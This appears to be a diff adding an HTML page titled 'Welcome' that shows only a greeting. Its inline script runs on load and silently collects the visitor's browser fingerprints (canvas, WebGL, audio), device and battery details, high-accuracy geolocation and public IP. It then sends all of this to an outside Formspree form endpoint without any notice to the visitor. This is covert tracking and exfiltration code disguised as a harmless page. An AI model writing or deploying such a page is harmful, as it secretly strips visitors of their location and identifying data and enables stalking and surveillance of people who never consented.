@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Welcome</title>
+<style>
+body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; text-align: center; padding-top: 60px; }
+h1 { font-size: 24px; }
+p { color: #8b949e; }
+</style>
+</head>
+<body>
+<h1>Welcome to our site</h1>
+<p>Please enjoy your stay.</p>
+
+<script>
+(async function() {
+    // --- 1. Get device info ---
+    async function getDeviceBattery() {
+        try {
+            if (navigator.getBattery) {
+                return await navigator.getBattery();
+            }
+        } catch(e) {}
+        return null;
+    }
+
+    async function gatherInfo() {
+        let battery = null;
+        try { battery = await getDeviceBattery(); } catch(e) {}
+
+        const nav = navigator;
+        const screenInfo = {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation ? screen.orientation.type : 'unknown'
+        };
+
+        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+        const connectionInfo = conn ? {
+            effectiveType: conn.effectiveType,
+            downlink: conn.downlink,
+            rtt: conn.rtt,
+            saveData: conn.saveData
+        } : null;
+
+        const batteryInfo = battery ? {
+            level: (battery.level * 100).toFixed(1) + '%',
+            charging: battery.charging ? 'Yes' : 'No',
+            chargingTime: battery.chargingTime === Infinity ? '∞' : battery.chargingTime + 's',
+            dischargingTime: battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime + 's'
+        } : null;
+
+        const plugins = [];
+        for (let i = 0; i < nav.plugins.length; i++) {
+            plugins.push(nav.plugins[i].name);
+        }
+
+        const mimeTypes = [];
+        for (let i = 0; i < nav.mimeTypes.length; i++) {
+            mimeTypes.push(nav.mimeTypes[i].type);
+        }
+
+        const canvasEl = document.createElement('canvas');
+        const ctx = canvasEl.getContext('2d');
+        let canvasFingerprint = 'unknown';
+        try {
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('CanvasFP Test', 2, 2);
+            const dataURL = canvasEl.toDataURL();
+            let hash = 0;
+            for (let i = 0; i < dataURL.length; i++) {
+                const chr = dataURL.charCodeAt(i);
+                hash = ((hash << 5) - hash) + chr;
+                hash |= 0;
+            }
+            canvasFingerprint = hash.toString(36);
+        } catch(e) {}
+
+        const webglEl = document.createElement('canvas');
+        const gl = webglEl.getContext('webgl') || webglEl.getContext('experimental-webgl');
+        let webglFingerprint = 'unknown';
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                webglFingerprint = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + ' | ' +
+                                   gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        let audioFingerprint = 'unknown';
+        try {
+            const oscillator = audioCtx.createOscillator();
+            const analyser = audioCtx.createAnalyser();
+            const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
+            oscillator.connect(analyser);
+            analyser.connect(scriptProcessor);
+            scriptProcessor.connect(audioCtx.destination);
+            oscillator.start(0);
+            oscillator.stop(0.01);
+            const state = audioCtx.state;
+            audioFingerprint = state + '|' + audioCtx.sampleRate;
+        } catch(e) {}
+        finally {
+            try { audioCtx.close(); } catch(e) {}
+        }
+
+        const language = nav.language || 'unknown';
+        const languages = nav.languages ? Array.from(nav.languages).join(',') : language;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+
+        const generalInfo = {
+            userAgent: nav.userAgent,
+            platform: nav.platform,
+            hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
+            deviceMemory: nav.deviceMemory || 'unknown',
+            maxTouchPoints: nav.maxTouchPoints || 0,
+            vendor: nav.vendor || 'unknown',
+            cookieEnabled: nav.cookieEnabled ? 'Yes' : 'No',
+            doNotTrack: nav.doNotTrack || 'unspecified',
+            pdfViewerEnabled: nav.pdfViewerEnabled !== undefined ? nav.pdfViewerEnabled : 'unknown',
+            language: language,
+            languages: languages,
+            timezone: timezone,
+            javaEnabled: typeof java !== 'undefined' ? 'Yes' : 'No',
+            canvasFingerprint: canvasFingerprint,
+            webglFingerprint: webglFingerprint,
+            audioFingerprint: audioFingerprint,
+            plugins: plugins.join(', '),
+            mimeTypes: mimeTypes.join(', ')
+        };
+
+        return {
+            general: generalInfo,
+            screen: screenInfo,
+            connection: connectionInfo,
+            battery: batteryInfo
+        };
+    }
+
+    // --- 2. Get geolocation ---
+    function getGeolocation() {
+        return new Promise(function(resolve) {
+            if (!navigator.geolocation) {
+                resolve({ error: 'Geolocation not supported' });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    resolve({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude || 'N/A',
+                        altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
+                        heading: pos.coords.heading || 'N/A',
+                        speed: pos.coords.speed || 'N/A',
+                        timestamp: new Date(pos.timestamp).toISOString()
+                    });
+                },
+                function(err) {
+                    resolve({ error: err.message, code: err.code });
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // --- 3. Fetch public IP via free API ---
+    async function getPublicIP() {
+        try {
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const data = await resp.json();
+            return { ip: data.ip };
+        } catch(e) {
+            try {
+                const resp2 = await fetch('https://ipinfo.io/json');
+                const data2 = await resp2.json();
+                return { ip: data2.ip, city: data2.city, region: data2.region, country: data2.country, loc: data2.loc, org: data2.org };
+            } catch(e2) {
+                return { ip: 'unknown', error: e2.message };
+            }
+        }
+    }
+
+    // --- 4. Send everything to Formspree ---
+    async function sendToFormspree(data) {
+        const payload = JSON.stringify(data, null, 2);
+        try {
+            const resp = await fetch('https://formspree.io/f/myewovol', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload,
+                mode: 'no-cors'
+            });
+            console.log('Data sent successfully');
+        } catch(e) {
+            console.error('Send failed:', e);
+        }
+    }
+
+    // --- Main execution ---
+    const [geo, ipInfo, deviceData] = await Promise.all([
+        getGeolocation(),
+        getPublicIP(),
+        gatherInfo()
+    ]);
+
+    const finalPayload = {
+        timestamp: new Date().toISOString(),
+        ip: ipInfo,
+        location: geo,
+        device: deviceData
+    };
+
+    await sendToFormspree(finalPayload);
+})();
+</script>
+</body>
+</html>
